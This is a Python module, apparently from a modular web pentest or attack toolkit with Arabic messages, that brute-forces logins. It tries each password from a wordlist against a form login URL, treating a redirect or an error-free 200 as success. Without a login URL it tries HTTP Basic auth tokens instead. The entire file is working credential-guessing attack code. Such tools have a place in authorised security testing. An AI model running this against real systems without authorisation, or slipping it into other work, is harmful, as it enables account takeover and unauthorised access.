# brute.py — هجوم كلمات المرور
import base64, urllib.parse
from core.registry import module
from core.http import req
from core.wordlists import USERS, PASSES
from core.helpers import load_list

@module("brute", "auth", "كلمات المرور (نموذج/Basic)")
def run(base, a, R):
    user = getattr(a, "user", None)
    if not user:
        R.info("--user admin للبدء (أو جرّب القائمة المدمجة)"); return
    passes = load_list(getattr(a, "passlist", "") or "") if getattr(a, "passlist", None) else PASSES
    login = getattr(a, "login_url", None)
    up, pp = getattr(a, "user_param", "username"), getattr(a, "pass_param", "password")
    if login:
        for pw in passes:
            data = urllib.parse.urlencode({up: user, pp: pw})
            st, h, b = req(base + login, method="POST", data=data,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
            low = b.lower()
            if st in (302, 303):
                R.vuln(f"نجاح (تحويل): {user}:{pw} -> {h.get('location','')[:60]}")
                return
            if st == 200 and not any(w in low for w in ["invalid","incorrect","failed",
                                                        "wrong","error","forbidden"]):
                R.vuln(f"نجاح محتمل: {user}:{pw} (HTTP 200 بدون رسالة خطأ)")
                return
        R.info("لا كلمة مرور صالحة في القائمة")
    else:
        for pw in passes:
            tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
            st, _, _ = req(base, headers={"Authorization": f"Basic {tok}"})
            if st not in (401, 403, 0):
                R.vuln(f"Basic auth ناجح: {user}:{pw} (HTTP {st})")
                return
        R.info("لا كلمة مرور صالحة في القائمة")
